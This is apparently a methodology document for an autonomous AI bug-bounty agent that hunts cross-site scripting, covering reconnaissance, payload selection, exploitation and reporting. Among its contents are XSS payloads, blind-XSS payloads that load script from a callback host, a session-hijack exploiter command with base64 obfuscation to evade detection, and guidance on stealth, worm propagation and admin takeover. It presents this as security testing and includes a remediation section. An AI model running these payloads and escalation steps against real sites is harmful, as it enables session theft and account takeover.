# XSS Agent Testing Methodology

## Overview

This document defines the complete, phased testing methodology for the BBAG3NT-09 XSS Hunter Agent. Each phase includes detailed procedures, tool commands, decision criteria, expected outputs, and time-boxing guidance. The methodology is designed for sequential execution with branching logic at key decision points, and supports both fully automated and hybrid manual workflows.

**Related documents**: `XSS_AGENT_PROMPT.md` (agent system prompt), `xss-agent-logic.md` (decision logic and trees)

---

## PHASE 1: Reconnaissance

**Objective**: Build a complete profile of the target before injecting a single payload.
**Time-box**: 15-30 minutes per target domain.
**Output**: Target profile document (technology stack, CSP policy, WAF vendor, auth model).

### 1.1 Technology Stack Identification

**Procedure**:
1. Run automated technology detection:
   ```bash
   wappalyzer https://target.com --pretty
   ```
2. Inspect HTTP response headers for server/framework indicators:
   ```bash
   curl -sI https://target.com | grep -iE "x-powered-by|server|x-aspnet|x-drupal|x-generator"
   ```
3. Inspect the HTML source for JavaScript framework fingerprints:
   - **React**: Look for `data-reactroot`, `_reactRootContainer`, `__NEXT_DATA__`
   - **Angular**: Look for `ng-app`, `ng-model`, `ng-version`, `getAllAngularRootElements`
   - **Vue.js**: Look for `data-v-*` attributes, `__vue__` on DOM elements
   - **jQuery**: Check for `jQuery` global, `$.fn.jquery` version string
   - **WordPress**: Look for `wp-content`, `wp-includes`, `wp-json`
4. Record all detected technologies in the target profile.

**Why this matters**: Framework detection drives payload selection. React escapes by default (target `dangerouslySetInnerHTML`), Angular has template injection vectors, jQuery's `.html()` is a known sink, and WordPress has known plugin vulnerabilities.

### 1.2 CSP Header Analysis

**Procedure**:
1. Retrieve CSP from response headers:
   ```bash
   curl -sI https://target.com | grep -i "content-security-policy"
   ```
2. Check for `Content-Security-Policy-Report-Only` (non-enforcing):
   ```bash
   curl -sI https://target.com | grep -i "content-security-policy-report-only"
   ```
3. Also check for CSP delivered via `<meta>` tag in HTML source (search page source for `http-equiv="Content-Security-Policy"`).
4. Run CSP through Google's CSP Evaluator for automated assessment.
5. Parse the following directives and record their values:
   - `default-src`
   - `script-src` (most critical for XSS)
   - `style-src`
   - `base-uri`
   - `form-action`
   - `object-src`
6. Identify CSP bypass opportunities:
   - `unsafe-inline` or `unsafe-eval` present = weak CSP
   - `data:` in script-src = data URI bypass possible
   - Whitelisted domains that serve JSONP or old Angular
   - Missing `base-uri` restriction = base tag injection possible
   - `strict-dynamic` present = script gadget hunting required
7. Run CSP analysis nuclei template:
   ```bash
   nuclei -t xss-agent/tools/nuclei-templates/csp-analysis.yaml -u https://target.com
   ```

**CSP categories and their testing implications**:

| Category | CSP Characteristics | XSS Strategy Impact |
|----------|-------------------|-------------------|
| No CSP | No header present | No restrictions; full payload library available |
| Weak CSP | `unsafe-inline` or `unsafe-eval` | Inline script injection works directly |
| Moderate CSP | Nonce-based but with whitelisted CDNs | Hunt for JSONP/Angular gadgets on whitelisted domains |
| Strong CSP | Nonce-based, `strict-dynamic`, no unsafe | Script gadget hunting only; pivot to non-execution attacks |
| Report-Only | Header present but non-enforcing | Treat as no CSP; payloads execute normally |

### 1.3 WAF Detection and Fingerprinting

**Procedure**:
1. Run automated WAF detection:
   ```bash
   wafw00f https://target.com
   ```
2. Submit a known-blocked payload and observe the response:
   ```bash
   curl -s "https://target.com/?q=<script>alert(1)</script>" -o /dev/null -w "%{http_code}"
   ```
   - HTTP 403, custom block page, or CAPTCHA = WAF active
   - HTTP 200 with payload stripped/modified = application-level filter
   - HTTP 200 with payload intact = no filtering
3. Check response headers for WAF signatures:
   ```bash
   curl -sI "https://target.com/?q=<script>" | grep -iE "cf-ray|x-sucuri|x-amz-cf|server.*cloudflare|server.*akamai"
   ```
4. Record WAF vendor and version (if detectable) in target profile.

**WAF vendor mapping**:
| Indicator | Vendor | Bypass Reference |
|-----------|--------|-----------------|
| `cf-ray` header | Cloudflare | KB file 17-waf-bypass-xss.md (Cloudflare section) |
| `x-sucuri-id` header | Sucuri | KB file 17-waf-bypass-xss.md (Sucuri section) |
| `x-akamai-transformed` header | Akamai | KB file 17-waf-bypass-xss.md (Akamai section) |
| `x-amz-cf-id` header | AWS CloudFront/WAF | KB file 17-waf-bypass-xss.md (AWS section) |
| Custom 403 HTML | ModSecurity / Custom | KB file 17-waf-bypass-xss.md (ModSecurity section) |

### 1.4 JavaScript Library Identification

**Procedure**:
1. Download and catalog all JavaScript files loaded by the target:
   ```bash
   katana -u https://target.com -jc -d 3 -o js-urls.txt
   ```
2. Check for known vulnerable library versions:
   - jQuery < 3.5.0 (prototype pollution, XSS via `.html()`)
   - Angular < 1.6 (template sandbox bypass)
   - Lodash < 4.17.21 (prototype pollution)
   - DOMPurify version (check for known bypasses)
3. Identify client-side sanitization libraries:
   - DOMPurify (search for `DOMPurify.sanitize`)
   - Angular DomSanitizer (search for `bypassSecurityTrust`)
   - Custom sanitizer functions (search for `sanitize`, `escapeHtml`, `cleanInput`)
4. Record all JS libraries and versions for framework-specific attack strategies.

### 1.5 Authentication Requirements Mapping

**Procedure**:
1. Classify all discoverable surfaces by authentication requirement:
   - **Unauthenticated**: Search bars, contact forms, login/registration, public comments
   - **Authenticated**: Profile fields, messaging, file uploads, settings, API endpoints
   - **Role-gated**: Admin dashboards, moderation tools, internal tools
2. For authenticated surfaces, request session context from BBAG3NT-03 (Auth Agent):
   ```json
   {
     "request_type": "session_context",
     "agent_id": "xss-agent",
     "target": "https://target.com",
     "requirements": {
       "roles_needed": ["user", "admin"],
       "session_count": 2,
       "include_csrf_tokens": true,
       "include_cookie_flags": true
     }
   }
   ```
3. Begin testing unauthenticated surfaces immediately while awaiting auth-agent response.

---

## PHASE 2: Context Analysis

**Objective**: Determine exactly how user input is reflected/processed for every discovered input point.
**Time-box**: 5-10 minutes per input point.
**Output**: Context classification and character survival matrix for each input.

### 2.1 Input Point Discovery

**Procedure**:
1. Run automated parameter mining:
   ```bash
   paramspider -d target.com --output params.txt
   arjun -u https://target.com/search -m GET POST
   ```
2. Crawl the application for comprehensive endpoint extraction:
   ```bash
   gospider -s https://target.com -d 3 -c 10 --js --sitemap --robots
   ```
3. Extract endpoints from JavaScript bundles:
   ```bash
   linkfinder -i https://target.com/static/app.js -o cli
   ```
4. Catalog all input vectors per the input vector enumeration table (URL params, POST body, headers, cookies, fragments, WebSocket, file uploads).
5. Check for hidden input fields and disabled form elements in HTML source.
6. Run xss-detector.py for automated detection:
   ```bash
   python3 xss-agent/tools/xss-detector.py -u "https://target.com/search?q=test" --context auto
   ```

### 2.2 Reflection Probe

For each discovered input point:

1. **Inject canary string**: `xss<>'"%;)(&#{}`
2. **Search the HTTP response** for the canary string.
3. **Record the HTML/JS context** surrounding the reflection point.
4. **Build the character survival matrix**: For each special character (`<`, `>`, `"`, `'`, `(`, `)`, `/`, `{`, `}`, `;`), record whether it survived unencoded.
5. **Classify the context** using the 13-context classification table (see XSS_AGENT_PROMPT.md Phase 3.2).

### 2.3 Context Identification Per Input Point

For each reflection point, determine:

| Question | How to Check | Implication |
|----------|-------------|-------------|
| Between HTML tags? | Canary inside `<div>`, `<p>`, etc. | HTML body context -- tag injection |
| Inside an attribute? | Canary inside `value="..."` | Attribute context -- breakout + event handler |
| Inside a URL attribute? | Canary inside `href="..."`, `src="..."` | URL context -- `javascript:` protocol |
| Inside a JS block? | Canary inside `<script>...</script>` | JS context -- string breakout |
| Inside template literal? | Canary inside backtick string | Template literal -- `${expression}` injection |
| Inside HTML comment? | Canary inside `<!-- -->` | Comment context -- close comment + inject |
| Inside CSS? | Canary inside `<style>` or `style=""` | CSS context -- exfiltration or expression |
| Inside SVG/MathML? | Canary inside `<svg>` or `<math>` | Foreign content -- namespace-specific events |
| Inside RCDATA element? | Canary inside `<textarea>`, `<title>` | RCDATA -- close parent first |
| In JSON response? | Canary in JSON body | Check Content-Type and X-Content-Type-Options |
| Not in response? | Canary absent from HTTP response | Check rendered DOM (DOM XSS) or consider stored/blind |
| In hidden input? | Canary in `<input type="hidden">` | Limited execution paths (accesskey trick) |

### 2.4 Encoding Detection

For each reflection, determine the encoding chain:

1. Submit raw `<` and check if response contains `<` (no encoding), `&lt;` (HTML entity), `%3C` (URL encoding), or `\u003c` (Unicode escape).
2. Submit raw `"` and check for `"` (no encoding), `&quot;` (HTML entity), `%22` (URL encoding), or `\"` (backslash escape in JS).
3. If encoding is applied, determine if it is:
   - Server-side encoding (appears in response source)
   - Client-side encoding (appears only in rendered DOM)
   - Double encoding (encoded twice)
   - Context-specific (only encoded in certain contexts)

---

## PHASE 3: Payload Engineering

**Objective**: Select and customize payloads appropriate for each identified injection context.
**Time-box**: 10-20 minutes per context type.
**Output**: Prioritized payload list per input point.

### 3.1 Context-Appropriate Payload Selection

Based on the context identified in Phase 2, select from the context-to-payload mapping table in XSS_AGENT_PROMPT.md Phase 4.1. Key selection criteria:

1. **Match the context**: Never use HTML tag payloads in JavaScript string context; never use JS breakout payloads in HTML body context.
2. **Start minimal**: Begin with the simplest payload for the context (e.g., `<img src=x onerror=alert(1)>` for HTML body).
3. **Avoid interaction-required payloads initially**: Prefer `onerror`, `onload`, `ontoggle`, `onfocus+autofocus` over `onclick`, `onmouseover` (the former require no user interaction).
4. **Factor in WAF**: If WAF was detected, start with uncommon tags and events instead of common ones.
5. **Factor in CSP**: If strict CSP is enforced, skip inline execution payloads and go directly to CSP bypass strategies.

### 3.2 Filter-Aware Payload Adjustment

If Phase 1 detected filtering, pre-adjust payloads:

| Filter Detected | Payload Adjustment |
|-----------------|-------------------|
| `<script>` tag blocked | Use alternative tags only (img, svg, details, math) |
| `onerror` blocked | Use ontoggle, onfocus, onpointerover, onanimationstart |
| `alert` blocked | Use confirm, prompt, print, or string concatenation bypasses |
| Angle brackets encoded | Stay in attribute context (event handlers only, no new tags) |
| Quotes encoded | Use backtick strings, unquoted attributes, or encoding bypasses |
| All `on*` prefixes blocked | Use `javascript:` protocol in URL attributes (href, src, action) |

### 3.3 Blind XSS Payload Preparation

Prepare blind XSS payloads before Phase 4 begins:

1. Configure callback server (XSS Hunter, bxss.in, or custom).
2. Generate unique canary IDs per input point for attribution.
3. Prepare payloads in multiple formats:
   - Script tag injection: `"><script src=https://YOUR-CALLBACK.xss.ht></script>`
   - Image error handler: `"><img src=x onerror="var s=document.createElement('script');s.src='https://YOUR-CALLBACK.xss.ht';document.body.appendChild(s);">`
   - Dynamic import: `'"><img src=x onerror=import('https://YOUR-CALLBACK.xss.ht')>`
4. Deploy to all admin-consumed inputs (contact forms, support tickets, feedback forms, user-agent strings, referrer headers, registration fields, file upload metadata).

---

## PHASE 4: Exploitation

**Objective**: Confirm XSS execution, demonstrate real-world impact, and maximize finding severity.
**Time-box**: 15-30 minutes per confirmed finding.
**Output**: Confirmed findings with PoC payloads and impact demonstration.

### 4.1 PoC Confirmation

For each candidate payload:

1. **Submit the payload** to the target input point.
2. **Verify execution** via one of:
   - `alert(document.domain)` popup in browser
   - Callback server ping (for blind XSS)
   - Browser console confirmation
3. **Verify reproducibility**: Clear browser cache/cookies and repeat.
4. **Verify deliverability**: Can the payload be triggered by a victim via URL click, stored content view, or other passive mechanism?
5. **Verify browser compatibility**: Test in Chrome and Firefox (latest stable).
6. **Reject false positives**: Apply false positive elimination criteria (see XSS_AGENT_PROMPT.md).

### 4.2 Impact Demonstration

Once execution is confirmed, escalate from `alert()` to real-world impact:

1. **Check cookie flags** (from auth-agent intelligence):
   - If cookies lack HttpOnly: demonstrate `document.cookie` theft
   - If HttpOnly set: demonstrate authenticated action execution
2. **Check for JS-accessible tokens**:
   - `localStorage.getItem('token')` / `sessionStorage.getItem('token')`
   - JavaScript variables containing auth tokens
3. **Select exploitation payload** based on impact tier (see XSS_AGENT_PROMPT.md Phase 7.1)
4. **Generate exploitation payload** using the exploiter tool:
   ```bash
   python3 xss-agent/tools/xss-exploiter.py \
     -u "https://target.com/vuln?param=" -p param \
     --payload session-hijack \
     --callback-url https://CALLBACK/collect
   ```

### 4.3 Stealthy Payload Generation

For maximum impact demonstration:

1. Generate a minified, obfuscated version of the exploitation payload.
2. Use base64 encoding to avoid signature detection:
   ```bash
   python3 xss-agent/tools/xss-exploiter.py \
     -u "URL" -p param --payload session-hijack --encode base64
   ```
3. Demonstrate that the payload executes without visible page modification (stealth factor).

### 4.4 Escalation Path Assessment

For each confirmed finding, evaluate escalation chains:

| Finding Type | Escalation Test | Tool/Method |
|-------------|----------------|-------------|
| Reflected XSS | Chain with open redirect | Check for open redirect parameters |
| Stored XSS | Test worm propagation feasibility | Can payload inject itself into other users' content? |
| Admin blind XSS | Attempt admin ATO | Craft password change / new admin payload |
| Any XSS | Chain with IDOR | Hand off endpoint to IDOR agent for cross-user write |
| Any XSS on Electron | Test RCE via nodeIntegration | Check for `nodeIntegration: true` in Electron config |

---

## PHASE 5: Reporting

**Objective**: Produce a complete, reproducible vulnerability report with CVSS scoring and remediation.
**Time-box**: 10-15 minutes per finding.
**Output**: Vulnerability report per finding + cross-agent handoffs.

### 5.1 Finding Classification

For each confirmed vulnerability:

1. **Classify XSS type**: Reflected, Stored, DOM-based, Blind
2. **Assign CWE**: CWE-79 with appropriate sub-type
3. **Calculate CVSS v3.1 score** using the scoring guide:
   - Reflected XSS baseline: 6.1 (Medium)
   - Stored XSS baseline: 5.4-9.0 (Medium to Critical)
   - Admin ATO via stored XSS: 9.0+ (Critical)
   - DOM XSS: same as reflected unless stored characteristics
4. **Document the full exploitation chain** if escalation was achieved

### 5.2 Reproduction Steps

Write step-by-step reproduction instructions that any tester can follow:

1. Navigate to [URL]
2. Enter the following payload in [parameter/field]: `[exact payload]`
3. Submit the form / navigate to the URL
4. Observe [execution evidence: alert popup, callback ping, DOM modification]
5. [If exploitation demonstrated]: Observe [impact evidence: cookie exfiltration, password change, etc.]

### 5.3 Remediation Recommendations

Provide context-specific remediation based on the injection context:

| Context | Primary Fix | Secondary Fix |
|---------|------------|---------------|
| HTML body | HTML entity encoding for all output | Implement CSP with nonce-based script-src |
| HTML attribute | Attribute encoding + always quote values | Avoid putting user input in attributes |
| JavaScript | JavaScript Unicode encoding; avoid inline data | Use JSON serialization with data attributes |
| URL (href/src) | Protocol whitelist (http/https only) + URL encoding | Implement CSP to prevent javascript: |
| CSS | CSS encoding; avoid user input in styles | Remove user-controlled CSS entirely |
| DOM sinks | Use `textContent` instead of `innerHTML` | Implement Trusted Types API |
| General | Output encoding + CSP + HttpOnly cookies + DOMPurify for rich content | Security headers, XSS Auditor considerations |

### 5.4 Cross-Agent Handoffs

After reporting, send finding handoffs to relevant agents:

1. **To IDOR Agent**: If stored XSS found on user-specific endpoint, test for IDOR to enable cross-user exploitation.
2. **To Auth Agent**: If session/token theft demonstrated, provide exploitation details for credential security assessment.
3. **To Injection Agents**: If input parameters show server-side processing anomalies, share for SQLi/CMDi testing.
4. **To Orchestrator**: Submit status report with finding summary and completion status.

---

## Automated + Manual Hybrid Workflow

### Automated Phase (Tools-First)

Execute these in parallel at the start of every engagement:

```bash
# 1. Technology and CSP scanning
nuclei -t xss-agent/tools/nuclei-templates/csp-analysis.yaml -u https://target.com &

# 2. Reflected XSS probing across all discovered parameters
python3 xss-agent/tools/xss-detector.py -u "https://target.com/search?q=test" --context auto -o reflected-results.json &

# 3. DOM XSS source identification
nuclei -t xss-agent/tools/nuclei-templates/dom-xss-sources.yaml -u https://target.com &

# 4. Blind XSS payload deployment
nuclei -t xss-agent/tools/nuclei-templates/blind-xss-inject.yaml -u https://target.com &

# 5. Stored XSS input point identification
nuclei -t xss-agent/tools/nuclei-templates/stored-xss-inputs.yaml -u https://target.com &

# 6. WAF detection
wafw00f https://target.com &

# 7. Full automated scan with Dalfox
dalfox url "https://target.com/search?q=test" --deep-domxss --format json -o dalfox-results.json &

wait  # Wait for all background jobs
```

### Manual Phase (Agent-Driven Analysis)

After automated tools complete:

1. **Review automated results**: Triage findings from xss-detector.py, Dalfox, and nuclei.
2. **Manual context analysis**: For each reflection point found by tools, manually classify context and character survival.
3. **Bypass engineering**: For filtered/WAF-blocked inputs, manually iterate through the 12-step bypass escalation ladder.
4. **DOM XSS deep dive**: Manually trace source-to-sink flows in JavaScript bundles identified by nuclei.
5. **Exploitation escalation**: For confirmed findings, manually craft impact demonstration payloads.
6. **Edge case testing**: Test file uploads (SVG, HTML), WebSocket messages, and header injection that automated tools may miss.

---

## Time-Boxed Approaches

### Quick Assessment (1-2 hours)

| Phase | Time | Activities |
|-------|------|-----------|
| Recon | 15 min | Wappalyzer, CSP check, WAF detection |
| Automated scan | 20 min | Run xss-detector.py + Dalfox on all discovered parameters |
| Context analysis | 15 min | Classify top 10 reflection points by priority score |
| Payload testing | 30 min | Test context-appropriate payloads on top 5 candidates |
| Exploitation | 15 min | Demonstrate impact for confirmed findings |
| Reporting | 15 min | Write findings with CVSS and reproduction steps |

### Standard Assessment (4-8 hours)

| Phase | Time | Activities |
|-------|------|-----------|
| Recon | 30 min | Full technology profiling, CSP analysis, WAF fingerprinting, JS library audit |
| Input discovery | 60 min | Parameter mining, crawling, JS endpoint extraction, hidden parameter brute-force |
| Context analysis | 60 min | Canary probe all inputs, classify all reflection points, encoding detection |
| Payload testing | 120 min | Full payload testing with bypass escalation, WAF bypass iteration |
| DOM XSS | 60 min | Source-sink analysis across all JavaScript bundles |
| Exploitation | 60 min | Impact demonstration for all confirmed findings, escalation path assessment |
| Reporting | 30 min | Complete reports with CVSS, reproduction, remediation, cross-agent handoffs |

### Deep Assessment (1-3 days)

All standard assessment activities plus:
- Exhaustive parameter brute-forcing with multiple wordlists
- Manual JavaScript code review for all client-side sinks
- Framework-specific attack vectors (Angular sandbox bypass, React SSR, Vue template injection)
- File upload XSS testing (SVG, HTML, EXIF metadata, PDF)
- WebSocket message injection testing
- PostMessage handler analysis
- Prototype pollution to XSS chain testing
- Mutation XSS (mXSS) testing against sanitizers
- CSP bypass exhaustive analysis (JSONP endpoints, script gadgets, base-uri)
- WAF bypass agent handoff with iterative feedback loop
- Cross-agent attack chain development (XSS + IDOR, XSS + SQLi)
- Blind XSS monitoring over multi-day period

---

## Key Methodology Principles

1. **Reconnaissance drives strategy**: Technology stack and CSP determine the entire payload selection approach. Never skip Phase 1.
2. **Context is everything**: The same input might land in HTML body on one endpoint and JavaScript string on another. Always probe context first.
3. **Bypass is iterative**: Filter evasion is not a single step but a ladder of escalating techniques. Systematically narrow down what is blocked and exploit the gaps.
4. **Impact wins bounties**: `alert(1)` is confirmation, not impact. Always escalate to demonstrate real-world consequences.
5. **Blind XSS is always deployed**: Every engagement should include blind XSS canary deployment to admin/internal input surfaces.
6. **Report quality matters**: A well-documented, reproducible finding with clear impact and remediation is worth more than ten poorly written ones.
7. **Cross-agent integration amplifies impact**: XSS findings combined with IDOR, auth, or injection findings create critical-severity attack chains that no single agent can achieve alone.
